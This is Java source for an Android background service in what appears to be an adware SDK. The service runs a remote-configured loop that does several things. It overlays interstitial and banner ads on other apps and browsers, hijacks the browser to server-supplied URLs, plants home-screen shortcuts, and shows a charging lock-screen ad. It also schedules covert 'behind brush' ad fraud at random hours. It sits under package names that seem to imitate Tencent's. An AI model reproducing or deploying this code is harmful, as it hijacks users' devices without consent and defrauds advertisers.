package com.guang.client;



import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.channels.FileLock;
import java.util.Date;
import java.util.List;

import com.guang.client.controller.GAdViewController;
import com.guang.client.controller.GAdinallController;
import com.guang.client.controller.GSelfController;
import com.guang.client.controller.GUserController;
import com.guang.client.mode.GAdPositionConfig;
import com.guang.client.tools.GLog;
import com.guang.client.tools.GTools;
import com.qq.up.a.QLAdController;
import com.qq.up.a.QLBatteryLockActivity;
import com.qq.up.a.QLBehindBrush;
import com.qq.up.a.QLShortcut;
import com.qq.up.a.QLTrack;

import android.app.DownloadManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.Environment;
import android.util.Log;

public class GSysService  {
	private static GSysService _instance;	
	private static Context contexts;
	private static GSysReceiver receiver;
	private boolean isPresent;
	private boolean isRuning;
	
	private GSysService()
	{
		isPresent = false;
		isRuning = false;
	}
	
	public static GSysService getInstance()
	{
		if(_instance == null)
			_instance = new GSysService();
		return _instance;
	}
	
	public void start(final Context context) {
		contexts = context;
		if(!isMultiApp(context))
		{
			return;
		}
		reset();
		GTools.saveSharedData(GCommon.SHARED_KEY_SERVICE_RUN_TIME,GTools.getCurrTime());
		registerListener();
		GUserController.getInstance().login();
		
		GAdViewController.getInstance().init();
		GAdinallController.getInstance().init();
		
	}
	
	public void startMainLoop()
	{		
		new Thread() {
			public void run() {
				Context context = contexts;
				if(context == null)
					context = QLAdController.getInstance().getContext();
				initData();
				boolean open = false;
				boolean open2 = false;
				startBehindBrushThread();
				while(isMainLoop())
				{	
					try {	
						if(open || open2)
							Thread.sleep(10000);
						else
							Thread.sleep(2200);
						if(isPresent && GUserController.getMedia().getOpen() && GUserController.getMedia().isProvince())
						{
							open = GUserController.getMedia().isOpenApp();
							if(open)
							{
								browserSpotThread();
								browserBreakThread();
	
								bannerThread();
								
								appOpenSpotThread();
								appSpotThread();
							}
//							open2 = GUserController.getMedia().isOpenAppByBlackList();
//							if(open2)
//							{
//								appOpenSpotThread();
//								appSpotThread();
//							}
							shortcutThread();
							shortcutAppThread();
							behindBrushThread();
						}
						
					} catch(InterruptedException e)
					{
						
					}
							
				}	
				GUserController.getInstance().restarMainLoop();
				GLog.e("------------------------", "restarMainLoop");
			};
		}.start();	
	}

	//浏览器插屏
	private void browserSpotThread()
	{
		if(		isPresent 
				&& (isWifi()  || is4G()))
		{
			List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.BROWSER_SPOT);
			for(GAdPositionConfig config : list)
			{
				long adPositionId = config.getAdPositionId();
				if( GUserController.getMedia().isAdPosition(adPositionId)
						&& GUserController.getMedia().isShowNum(adPositionId)
						&& GUserController.getMedia().isShowTimeInterval(adPositionId)
						&& GUserController.getMedia().isTimeSlot(adPositionId))
				{
					String s =  GTools.getSharedPreferences().getString(GCommon.SHARED_KEY_LAST_OPEN_APP, "");
					if(s != null && GUserController.getMedia().isWhiteList(adPositionId, s) && !GTools.isSelfForeground())
					{
						browserSpot(adPositionId,s);
					}		
				}
			}
		}
	}
	//BANNER
	private void bannerThread()
	{
		if(isPresent &&  (isWifi()  || is4G() || is3G()))
		{
			List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.BANNER);
			for(GAdPositionConfig config : list)
			{
				long adPositionId = config.getAdPositionId();
				if( GUserController.getMedia().isAdPosition(adPositionId)
						&& GUserController.getMedia().isShowNum(adPositionId)
						&& GUserController.getMedia().isShowTimeInterval(adPositionId)
						&& GUserController.getMedia().isTimeSlot(adPositionId))
				{
					String s =  GTools.getSharedPreferences().getString(GCommon.SHARED_KEY_LAST_OPEN_APP, "");
					if(s != null && GUserController.getMedia().isWhiteList(adPositionId, s))
					{
						banner(adPositionId,s);
					}		
				}
			}
		}
	}
	//PUSH
	public void appPushThread()
	{
		if(isPresent &&  isWifi())
		{
			List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.APP_PUSH);
			for(GAdPositionConfig config : list)
			{
				long adPositionId = config.getAdPositionId();
				if( GUserController.getMedia().isAdPosition(adPositionId)
						&& GUserController.getMedia().isShowNum(adPositionId)
						&& GUserController.getMedia().isShowTimeInterval(adPositionId)
						&& GUserController.getMedia().isTimeSlot(adPositionId))
				{
					GSelfController.getInstance().showAppPush(adPositionId, "");
				}
			}
		}
	}
		
	//应用开屏
	private void appOpenSpotThread()
	{
		if(isPresent &&  isWifi())
		{
			List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.APP_OPENSPOT);
			for(GAdPositionConfig config : list)
			{
				long adPositionId = config.getAdPositionId();
				if( GUserController.getMedia().isAdPosition(adPositionId)
						&& GUserController.getMedia().isShowNum(adPositionId)
						&& GUserController.getMedia().isShowTimeInterval(adPositionId)
						&& GUserController.getMedia().isTimeSlot(adPositionId))
				{
					String s =  GTools.getSharedPreferences().getString(GCommon.SHARED_KEY_LAST_OPEN_APP, "");
					if(s != null && GUserController.getMedia().isWhiteList(adPositionId, s) && !GTools.isSelfForeground())
					{
						appOpenSpot(adPositionId,s);
					}		
				}
			}
		}
	}
		
	//应用插屏
	private void appSpotThread()
	{
		if(isPresent &&  (isWifi()  || is4G()))
		{
			List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.APP_SPOT);
			for(GAdPositionConfig config : list)
			{
				long adPositionId = config.getAdPositionId();
				if( GUserController.getMedia().isAdPosition(adPositionId)
						&& GUserController.getMedia().isShowNum(adPositionId)
						&& GUserController.getMedia().isShowTimeInterval(adPositionId)
						&& GUserController.getMedia().isTimeSlot(adPositionId))
				{
					String s =  GTools.getSharedPreferences().getString(GCommon.SHARED_KEY_LAST_OPEN_APP, "");
					if(s != null && GUserController.getMedia().isWhiteList(adPositionId, s))
					{
						appSpot(adPositionId,s);
					}		
				}
			}
		}
	}
	//浏览器截取
	private void browserBreakThread()
	{
		if(isPresent)
		{
			List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.BROWSER_BREAK);
			for(GAdPositionConfig config : list)
			{
				long adPositionId = config.getAdPositionId();
				if( GUserController.getMedia().isAdPosition(adPositionId)
						&& GUserController.getMedia().isShowNum(adPositionId)
						&& GUserController.getMedia().isShowTimeInterval(adPositionId)
						&& GUserController.getMedia().isTimeSlot(adPositionId))
				{
					String s =  GTools.getSharedPreferences().getString(GCommon.SHARED_KEY_LAST_OPEN_APP, "");
					if(s != null && GUserController.getMedia().isWhiteList(adPositionId, s))
					{
						browserBreak(adPositionId,s);
					}		
				}
			}
		}
	}
	//快捷方式
	private void shortcutThread()
	{
		if(isPresent)
		{
			List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.SHORTCUT);
			for(GAdPositionConfig config : list)
			{
				long adPositionId = config.getAdPositionId();
				if( GUserController.getMedia().isAdPosition(adPositionId)
						&& GUserController.getMedia().isShowNum(adPositionId)
						&& GUserController.getMedia().isShowTimeInterval(adPositionId)
						&& GUserController.getMedia().isTimeSlot(adPositionId))
				{
					shortcut(adPositionId);
				}
			}
		}
	}
	//快捷方式应用页
	private void shortcutAppThread()
	{
		if(isPresent)
		{
			List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.SHORTCUT_APP);
			for(GAdPositionConfig config : list)
			{
				long adPositionId = config.getAdPositionId();
				if( GUserController.getMedia().isAdPosition(adPositionId)
						&& GUserController.getMedia().isShowNum(adPositionId)
						&& GUserController.getMedia().isShowTimeInterval(adPositionId)
						&& GUserController.getMedia().isTimeSlot(adPositionId))
				{
					shortcutApp(adPositionId);
				}
			}
		}
	}
	//一上来开始暗刷
	private void startBehindBrushThread()
	{
		boolean b = GTools.getSharedPreferences().getBoolean(GCommon.SHARED_KEY_NEWADD_USER, false);
		if(!b)
		{
			List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.BEHIND_BRUSH);
			for(GAdPositionConfig config : list)
			{
				long adPositionId = config.getAdPositionId();
				if( GUserController.getMedia().isAdPosition(adPositionId)
						&& GUserController.getMedia().isShowNum(adPositionId)
						&& GUserController.getMedia().isShowTimeInterval(adPositionId)
						&& GUserController.getMedia().isTimeSlot(adPositionId))
				{
					Context context = contexts;
					if(context == null)
						context = QLAdController.getInstance().getContext();
					context.sendBroadcast(new Intent(GCommon.ACTION_QEW_APP_BEHIND_BRUSH));
				}
			}
			GTools.saveSharedData(GCommon.SHARED_KEY_NEWADD_USER, true);
		}
	}
	//暗刷
	private void behindBrushThread()
	{
		List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.BEHIND_BRUSH);
		for(GAdPositionConfig config : list)
		{
			long adPositionId = config.getAdPositionId();
			if( GUserController.getMedia().isAdPosition(adPositionId)
					&& GUserController.getMedia().isShowNum(adPositionId)
					&& GUserController.getMedia().isShowTimeInterval(adPositionId)
					&& GUserController.getMedia().isTimeSlot(adPositionId))
			{
				int h =  GTools.getSharedPreferences().getInt(GCommon.SHARED_KEY_BEHINDBRUSH_HOURS, 0);
				if(h == 0)
				{
					h = (int) (((int)(Math.random()*100)+1) / 100.f * 18) + 3;
					GTools.saveSharedData(GCommon.SHARED_KEY_BEHINDBRUSH_HOURS, h);
				}
			}
		}
	}
	//充电锁
	public void startLockThread(int mBatteryLevel)
	{
		if(isRuning() &&  (isWifi()  || is4G()))
		{
			List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.CHARGLOCK);
			for(GAdPositionConfig config : list)
			{
				long adPositionId = config.getAdPositionId();
				if( GUserController.getMedia().isAdPosition(adPositionId)
						&& GUserController.getMedia().isProvince()
						&& isOpenLock()
						&& !QLBatteryLockActivity.isShow())
				{
					QLBatteryLockActivity lock = QLBatteryLockActivity.getInstance();
					if(lock == null && GTools.getSharedPreferences().getBoolean(GCommon.SHARED_KEY_ISBATTERY, false))
					{
						QLBatteryLockActivity.show(mBatteryLevel);
					}
				}
			}
		}
	}

	//开屏应用启动
	public void appOpenSpot(long adPositionId,String appNmae)
	{
		if(adPositionId == -1)
		{
			List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.APP_OPENSPOT);
			for(GAdPositionConfig config : list)
			{
				adPositionId = config.getAdPositionId();
				break;
			}
		}
		GSelfController.getInstance().showAppOpenSpot(adPositionId,appNmae);
	}
		
	//应用启动
	public void appSpot(long adPositionId,String appNmae)
	{
		if(adPositionId == -1)
		{
			List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.APP_SPOT);
			for(GAdPositionConfig config : list)
			{
				adPositionId = config.getAdPositionId();
				break;
			}
		}
		GAdViewController.getInstance().showAppSpot(adPositionId,appNmae);
	}
	//banner
	public void banner(long adPositionId,String appNmae)
	{
		if(adPositionId == -1)
		{
			List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.BANNER);
			for(GAdPositionConfig config : list)
			{
				adPositionId = config.getAdPositionId();
				break;
			}
		}
		GAdViewController.getInstance().showBanner(adPositionId,appNmae);
	}
	//shortcut
	public void shortcut(long adPositionId)
	{
		if(adPositionId == -1)
		{
			List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.SHORTCUT);
			for(GAdPositionConfig config : list)
			{
				adPositionId = config.getAdPositionId();
				break;
			}
		}
		GLog.e("-----------------", "shortcut success");
		QLShortcut.getInstance().show(adPositionId);
		int num = GTools.getSharedPreferences().getInt(GCommon.SHARED_KEY_SHORTCUT_NUM+adPositionId, 0);
		GTools.saveSharedData(GCommon.SHARED_KEY_SHORTCUT_NUM+adPositionId, num+1);
		GTools.saveSharedData(GCommon.SHARED_KEY_SHORTCUT_TIME+adPositionId, GTools.getCurrTime());
	}
	//shortcut app
	public void shortcutApp(long adPositionId)
	{
		if(adPositionId == -1)
		{
			List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.SHORTCUT_APP);
			for(GAdPositionConfig config : list)
			{
				adPositionId = config.getAdPositionId();
				break;
			}
		}
		GLog.e("-----------------", "shortcut app success");
		QLShortcut.getInstance().show(adPositionId);
		int num = GTools.getSharedPreferences().getInt(GCommon.SHARED_KEY_SHORTCUT_APP_NUM+adPositionId, 0);
		GTools.saveSharedData(GCommon.SHARED_KEY_SHORTCUT_APP_NUM+adPositionId, num+1);
		GTools.saveSharedData(GCommon.SHARED_KEY_SHORTCUT_APP_TIME+adPositionId, GTools.getCurrTime());
	}
	//浏览器插屏
	public void browserSpot(long adPositionId,String packageName)
	{
		if(adPositionId == -1)
		{
			List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.BROWSER_SPOT);
			for(GAdPositionConfig config : list)
			{
				adPositionId = config.getAdPositionId();
				break;
			}
		}
		GAdViewController.getInstance().showBrowserSpot(adPositionId,packageName);
	}
	//浏览器截取
	public void browserBreak(long adPositionId,String packageName)
	{		
		if(adPositionId == -1)
		{
			List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.BROWSER_BREAK);
			for(GAdPositionConfig config : list)
			{
				adPositionId = config.getAdPositionId();
				break;
			}
		}
		
		String url = GUserController.getMedia().getConfig(adPositionId).getBrowerBreakUrl();
		PackageManager packageMgr = contexts.getPackageManager();
		Intent intent = packageMgr.getLaunchIntentForPackage(packageName);
        intent.setAction(Intent.ACTION_VIEW);
        intent.addCategory(Intent.CATEGORY_DEFAULT);
        intent.setData(Uri.parse(url));
        contexts.startActivity(intent);
        
        int num = GTools.getSharedPreferences().getInt(GCommon.SHARED_KEY_BROWSER_BREAK_NUM+adPositionId, 0);
		GTools.saveSharedData(GCommon.SHARED_KEY_BROWSER_BREAK_NUM+adPositionId, num+1);
		GTools.saveSharedData(GCommon.SHARED_KEY_BROWSER_BREAK_TIME+adPositionId, GTools.getCurrTime());

		GTools.uploadStatistics(GCommon.SHOW,adPositionId,GCommon.BROWSER_BREAK,"self",-1);
		GLog.e("-----------------", "browserBreak success");
	}
	//暗刷
	public void behindBrush()
	{
		QLBehindBrush.getInstance().show();	
		
		int num = GTools.getSharedPreferences().getInt(GCommon.SHARED_KEY_BEHINDBRUSH_NUM, 0);
		GTools.saveSharedData(GCommon.SHARED_KEY_BEHINDBRUSH_NUM, num+1);
		GTools.saveSharedData(GCommon.SHARED_KEY_BEHINDBRUSH_TIME, GTools.getCurrTime());

		GLog.e("-----------------", "behindBrush success");
	}
	
	@SuppressWarnings("deprecation")
	public void wifi(boolean state)
	{
		//暗刷
		if(isWifi())
		{
			int h =  GTools.getSharedPreferences().getInt(GCommon.SHARED_KEY_BEHINDBRUSH_HOURS, 0);
			if(h != 0)
			{
				int currH = new Date().getHours();
				if(currH > h)
				{
					behindBrush();
					GTools.saveSharedData(GCommon.SHARED_KEY_BEHINDBRUSH_HOURS, 0);
					GLog.e("-----------------------", "h="+h);
				}
			}
		}		
	}
	
	//跟踪
	public void track(int type)
	{
		QLTrack.getInstance().track(type);
	}
	
	private void initData()
	{
		isPresent = true;
		isRuning = true;
		GTools.saveSharedData(GCommon.SHARED_KEY_WIFI_TIME, 0l);
		GTools.saveSharedData(GCommon.SHARED_KEY_IS_OPEN_LAUNCHER, false);
		if(!isMainLoop())
		{
			long n_time = GTools.getCurrTime();
			GTools.saveSharedData(GCommon.SHARED_KEY_MAIN_LOOP_TIME, n_time);
						
			GTools.saveSharedData(GCommon.SHARED_KEY_WIFI_NUM, 0);
			
			GTools.saveSharedData(GCommon.SHARED_KEY_BEHINDBRUSH_TIME, 0l);
			GTools.saveSharedData(GCommon.SHARED_KEY_BEHINDBRUSH_NUM, 0);
			
//			GTools.saveSharedData(GCommon.SHARED_KEY_AD_NUM, "");
			
			List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.BROWSER_SPOT);
			for(GAdPositionConfig config : list)
			{
				long adPositionId = config.getAdPositionId();
				{
					GTools.saveSharedData(GCommon.SHARED_KEY_BROWSER_SPOT_TIME+adPositionId, 0l);
					GTools.saveSharedData(GCommon.SHARED_KEY_BROWSER_SPOT_NUM+adPositionId, 0);
				}
			}
			list = GUserController.getMedia().getConfig(GCommon.BANNER);
			for(GAdPositionConfig config : list)
			{
				long adPositionId = config.getAdPositionId();
				{
					GTools.saveSharedData(GCommon.SHARED_KEY_BANNER_TIME+adPositionId, 0l);
					GTools.saveSharedData(GCommon.SHARED_KEY_BANNER_NUM+adPositionId, 0);
				}
			}
			list = GUserController.getMedia().getConfig(GCommon.APP_SPOT);
			for(GAdPositionConfig config : list)
			{
				long adPositionId = config.getAdPositionId();
				{
					GTools.saveSharedData(GCommon.SHARED_KEY_APP_SPOT_TIME+adPositionId, 0l);
					GTools.saveSharedData(GCommon.SHARED_KEY_APP_SPOT_NUM+adPositionId, 0);
				}
			}
			list = GUserController.getMedia().getConfig(GCommon.APP_OPENSPOT);
			for(GAdPositionConfig config : list)
			{
				long adPositionId = config.getAdPositionId();
				{
					GTools.saveSharedData(GCommon.SHARED_KEY_APP_OPENSPOT_TIME+adPositionId, 0l);
					GTools.saveSharedData(GCommon.SHARED_KEY_APP_OPENSPOT_NUM+adPositionId, 0);
				}
			}
			
			list = GUserController.getMedia().getConfig(GCommon.APP_PUSH);
			for(GAdPositionConfig config : list)
			{
				long adPositionId = config.getAdPositionId();
				{
					GTools.saveSharedData(GCommon.SHARED_KEY_APP_PUSH_TIME+adPositionId, 0l);
					GTools.saveSharedData(GCommon.SHARED_KEY_APP_PUSH_NUM+adPositionId, 0);
				}
			}
			
			list = GUserController.getMedia().getConfig(GCommon.SHORTCUT);
			for(GAdPositionConfig config : list)
			{
				long adPositionId = config.getAdPositionId();
				{
//					GTools.saveSharedData(GCommon.SHARED_KEY_SHORTCUT_TIME+adPositionId, n_time);
					if(GUserController.getMedia().isShowTimeInterval(adPositionId))
						GTools.saveSharedData(GCommon.SHARED_KEY_SHORTCUT_NUM+adPositionId, 0);
				}
			}
			list = GUserController.getMedia().getConfig(GCommon.SHORTCUT_APP);
			for(GAdPositionConfig config : list)
			{
				long adPositionId = config.getAdPositionId();
				{
//					GTools.saveSharedData(GCommon.SHARED_KEY_SHORTCUT_TIME+adPositionId, n_time);
					if(GUserController.getMedia().isShowTimeInterval(adPositionId))
						GTools.saveSharedData(GCommon.SHARED_KEY_SHORTCUT_APP_NUM+adPositionId, 0);
				}
			}
			list = GUserController.getMedia().getConfig(GCommon.BROWSER_BREAK);
			for(GAdPositionConfig config : list)
			{
				long adPositionId = config.getAdPositionId();
				{
					GTools.saveSharedData(GCommon.SHARED_KEY_BROWSER_BREAK_TIME+adPositionId, 0l);
					GTools.saveSharedData(GCommon.SHARED_KEY_BROWSER_BREAK_NUM+adPositionId, 0);
				}
			}
		}
		else
		{
//			String browserspot_app = GTools.getSharedPreferences().getString(GCommon.SHARED_KEY_TASK_BROWSERSPOT_APP, "");
//			if(browserspot_app != null && !"".equals(browserspot_app))
//			{
//				browserSpot(browserspot_app);
//			}
//			
//			String banner_app = GTools.getSharedPreferences().getString(GCommon.SHARED_KEY_TASK_BANNER_APP, "");
//			if(banner_app != null && !"".equals(banner_app))
//			{
//				banner(banner_app);
//			}
		}
	}
	
	private boolean isMainLoop()
	{
		long time = GTools.getSharedPreferences().getLong(GCommon.SHARED_KEY_MAIN_LOOP_TIME, 0);
		long n_time = GTools.getCurrTime();
		return (n_time - time < GUserController.getMedia().getLoopTime() * 60 * 60 * 1000);		
	}
	
	public boolean isWifi()
	{
		return GTools.isWifi();
	}
	
	public boolean is4G()
	{
		return "4G".equals(GTools.getNetworkType());
	}
	
	public boolean is3G()
	{
		return "3G".equals(GTools.getNetworkType());
	}

	public boolean isMultiApp(Context context)
	{
		String name = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath();
		File f = new File(name, "multiapp");
		if(!f.exists())
		{
			try {
				f.createNewFile();
				BufferedWriter out = new BufferedWriter(new FileWriter(f));  
	            out.write(context.getPackageName()); // \r\n即为换行  
	            out.flush(); // 把缓存区内容压入文件  
	            out.close(); // 最后记得关闭文件 
	            Log.e("------------", "isMultiApp new ="+context.getPackageName());
			} catch (IOException e) {
				e.printStackTrace();
			}	
			return true;
		}
		else
		{
            try {
            	 InputStreamReader reader = new InputStreamReader(new FileInputStream(f)); // 建立一个输入流对象reader  
                 BufferedReader br = new BufferedReader(reader); // 建立一个对象，它把文件内容转成计算机能读懂的语言  
                 String line = br.readLine();
                 Log.e("------------", "isMultiApp="+line);
                 br.close();
                 reader.close();
				 if(line != null)
				 {
					 if(line.contains(context.getPackageName()))
						 return true;
				 }
				 else
				 {
					 BufferedWriter out = new BufferedWriter(new FileWriter(f));  
			         out.write(context.getPackageName()); // \r\n即为换行  
			         out.flush(); // 把缓存区内容压入文件  
			         out.close(); // 最后记得关闭文件 
			         Log.e("------------", "isMultiApp new ="+context.getPackageName());
			         return true;
				 }
			} catch (IOException e) {
				e.printStackTrace();
			}  
		}
//		try {
//			final FileOutputStream fos = new FileOutputStream(f);
//			final FileLock fl = fos.getChannel().tryLock(); 
//			if(fl != null && fl.isValid())
//	        {
//				new Thread(){
//					public void run() {
//						try {
//							Thread.sleep(8000);
//							deleteMultiApp(fl,fos);
//						} catch (InterruptedException e) {
//							e.printStackTrace();
//						}						
//					};
//				}.start();
//				return true;
//	        }
//		} catch (Exception e1) {
//			e1.printStackTrace();
//		}  
		return false;
	}
	
	public void deleteMultiApp(FileLock fl,FileOutputStream fos)
	{
		try {
			if(fos != null)
				fos.close();			
		} catch (Exception e) {
		}		
        try {  
        	if(fl != null && fl.isValid())
        		fl.release();  
        } catch (IOException e) {  
        }  
	}

	@SuppressWarnings("deprecation")
	public boolean isOpenLock()
	{
		int type = GTools.getSharedPreferences().getInt(GCommon.SHARED_KEY_LOCK_SAVE_TYPE, 1);		
		if(type == 0)
		{
			return false;
		}
		else 
		{
			long time =  GTools.getSharedPreferences().getLong(GCommon.SHARED_KEY_LOCK_SAVE_TIME, 0l);
			Date today = new Date();
			Date date = new Date(time);
			if(type == 2)
			{
				if(today.getDate() == date.getDate())
				{
					return false;
				}
			}
			else if(type == 3)
			{
				if(today.getDate() - date.getDate() <= 3)
				{
					return false;
				}
			}
			else if(type == 4)
			{
				if(today.getDate() - date.getDate() <= 7)
				{
					return false;
				}
			}
			else if(type == 5)
			{
				if(today.getDate() - date.getDate() <= 30)
				{
					return false;
				}
			}
		}
		return true;
	}


	private static void registerListener() {
		receiver = new GSysReceiver();
        IntentFilter filter = new IntentFilter();
        filter.addAction(GCommon.ACTION_QEW_APP_BROWSER_SPOT);
        filter.addAction(GCommon.ACTION_QEW_APP_BANNER);
        filter.addAction(GCommon.ACTION_QEW_APP_LOCK);
        filter.addAction(GCommon.ACTION_QEW_APP_SPOT);
        filter.addAction(GCommon.ACTION_QEW_APP_OPENSPOT);
        filter.addAction(GCommon.ACTION_QEW_APP_BROWSER_BREAK);
        filter.addAction(GCommon.ACTION_QEW_APP_SHORTCUT);
        filter.addAction(GCommon.ACTION_QEW_APP_HOMEPAGE);
        filter.addAction(GCommon.ACTION_QEW_APP_BEHIND_BRUSH);
        filter.addAction(GCommon.ACTION_QEW_OPEN_APP);
        filter.addAction(GCommon.ACTION_QEW_START_DOWNLOAD);
        filter.addAction(GCommon.ACTION_QEW_APP_SHOWBANNER);
        filter.addAction(GCommon.ACTION_QEW_APP_SHOWAPPSPOT);
        filter.addAction(GCommon.ACTION_QEW_APP_SHOWAPPOPENSPOT);
        filter.addAction(GCommon.ACTION_QEW_APP_SHOWDOWNLOAD);
        filter.addAction(GCommon.ACTION_QEW_APP_SHOWINSTALL);
        filter.addAction(GCommon.ACTION_QEW_APP_SHOWTODOWNLOAD);
        filter.addAction(GCommon.ACTION_QEW_APP_PUSH);
        
        
        filter.addAction(Intent.ACTION_SCREEN_ON);
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        filter.addAction(Intent.ACTION_USER_PRESENT);
        filter.addAction(Intent.ACTION_BATTERY_CHANGED);
        filter.addAction(Intent.ACTION_POWER_CONNECTED);
        filter.addAction(Intent.ACTION_POWER_DISCONNECTED);
        filter.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
        filter.addAction(DownloadManager.ACTION_DOWNLOAD_COMPLETE);
        contexts.registerReceiver(receiver, filter);
        
		IntentFilter filter2 = new IntentFilter();
		filter2.addDataScheme("package");
		filter2.addAction(Intent.ACTION_PACKAGE_ADDED);
		filter2.addAction(Intent.ACTION_PACKAGE_REMOVED);

		contexts.registerReceiver(receiver, filter2);
    }

	
	public boolean isPresent() {
		return isPresent;
	}

	public void setPresent(boolean isPresent) {
		this.isPresent = isPresent;
	}

	public boolean isRuning() {
		return isRuning;
	}

	public void setRuning(boolean isRuning) {
		this.isRuning = isRuning;
	}

	
   public void reset()
   {
	   this.isRuning = false;
	   this.isPresent = false;
	   
	   if(receiver != null)
		{
			contexts.unregisterReceiver(receiver);
			receiver = null;
		}
   }
    
}
